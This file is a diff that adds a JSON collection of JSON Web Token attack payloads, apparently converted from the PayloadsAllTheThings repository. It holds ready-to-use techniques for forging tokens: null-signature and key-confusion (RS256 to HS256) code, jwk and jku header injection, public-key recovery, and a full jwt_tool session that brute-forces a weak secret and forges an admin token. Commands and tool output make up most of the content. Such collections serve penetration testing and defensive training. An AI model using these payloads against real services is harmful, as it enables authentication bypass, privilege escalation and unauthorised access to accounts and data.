@@ -1,0 +1,160 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "json_web_token",
+  "original_category": "JSON Web Token",
+  "payloads": [
+    {
+      "category": "JWT Format",
+      "escalation": "baseline",
+      "lines": [
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header",
+        "eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload",
+        "UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature"
+      ]
+    },
+    {
+      "category": "Header",
+      "escalation": "baseline",
+      "lines": [
+        "{",
+        "\"typ\": \"JWT\",",
+        "\"alg\": \"HS256\"",
+        "}"
+      ]
+    },
+    {
+      "category": "Payload",
+      "escalation": "baseline",
+      "lines": [
+        "{",
+        "\"sub\":\"1234567890\",",
+        "\"name\":\"Amazing Haxx0r\",",
+        "\"exp\":\"1466270722\",",
+        "\"admin\":true",
+        "}"
+      ]
+    },
+    {
+      "category": "JWT Signature - Null Signature Attack (CVE-2020-28042)",
+      "escalation": "baseline",
+      "lines": [
+        "python3 jwt_tool.py JWT_HERE -X n",
+        "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.",
+        "{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022}"
+      ]
+    },
+    {
+      "category": "JWT Signature - Disclosure of a correct signature (CVE-2019-7644)",
+      "escalation": "baseline",
+      "lines": [
+        "Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs",
+        "Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo="
+      ]
+    },
+    {
+      "category": "JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)",
+      "escalation": "baseline",
+      "lines": [
+        "import jwt",
+        "public = open('public.pem', 'r').read()",
+        "print public",
+        "print jwt.encode({\"data\":\"test\"}, key=public, algorithm='HS256')"
+      ]
+    },
+    {
+      "category": "JWT Signature - Key Injection Attack (CVE-2018-0114)",
+      "escalation": "baseline",
+      "lines": [
+        "{",
+        "\"alg\": \"RS256\",",
+        "\"typ\": \"JWT\",",
+        "\"jwk\": {",
+        "\"kty\": \"RSA\",",
+        "\"kid\": \"jwt_tool\",",
+        "\"use\": \"sig\",",
+        "\"e\": \"AQAB\",",
+        "\"n\": \"uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw\"",
+        "}",
+        "}.",
+        "{\"login\":\"admin\"}.",
+        "[Signed with new Private key; Public key injected]"
+      ]
+    },
+    {
+      "category": "JWT Signature - Recover Public Key From Signed JWTs",
+      "escalation": "baseline",
+      "lines": [
+        "$ docker run -it ttervoort/jws2pubkey JWS1 JWS2",
+        "$ docker run -it ttervoort/jws2pubkey \"$(cat sample-jws/sample1.txt)\" \"$(cat sample-jws/sample2.txt)\" | tee pubkey.jwk",
+        "Computing public key. This may take a minute...",
+        "{\"kty\": \"RSA\", \"n\": \"sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ\", \"e\": \"AQAB\"}"
+      ]
+    },
+    {
+      "category": "Break JWT secret",
+      "escalation": "baseline",
+      "lines": [
+        "python3 -m pip install termcolor cprint pycryptodomex requests",
+        "python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C",
+        "Current value of role is: user",
+        "Please enter new value and hit ENTER",
+        "> admin",
+        "[1] sub = 1234567890",
+        "[2] role = admin",
+        "[3] iat = 1516239022",
+        "[0] Continue to next step",
+        "Please select a field number (or 0 to Continue):",
+        "> 0",
+        "Token Signing:",
+        "[1] Sign token with known key",
+        "[2] Strip signature from token vulnerable to CVE-2015-2951",
+        "[3] Sign with Public Key bypass vulnerability",
+        "[4] Sign token with key file",
+        "Please select an option from above (1-4):",
+        "> 1",
+        "Please enter the known key:",
+        "> secret",
+        "Please enter the key length:",
+        "[1] HMAC-SHA256",
+        "[2] HMAC-SHA384",
+        "[3] HMAC-SHA512",
+        "> 1",
+        "Your new forged token:",
+        "[+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic",
+        "[+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic"
+      ]
+    },
+    {
+      "category": "JWT kid Claim Misuse",
+      "escalation": "baseline",
+      "lines": [
+        "// Example for HS256",
+        "HMACSHA256(",
+        "base64UrlEncode(header) + \".\" +",
+        "base64UrlEncode(payload),",
+        "your-256-bit-secret-from-secret.key",
+        ")"
+      ]
+    },
+    {
+      "category": "JWKS - jku header injection",
+      "escalation": "baseline",
+      "lines": [
+        "{",
+        "\"keys\": [",
+        "{",
+        "\"kid\": \"beaefa6f-8a50-42b9-805a-0ab63c3acc54\",",
+        "\"kty\": \"RSA\",",
+        "\"e\": \"AQAB\",",
+        "\"n\": \"nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ\"",
+        "}",
+        "]",
+        "}",
+        "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"https://example.com/jwks.json\", \"kid\":\"id_of_jwks\"}.",
+        "{\"login\":\"admin\"}.",
+        "[Signed with new Private key; Public key exported]"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.871Z"
+}
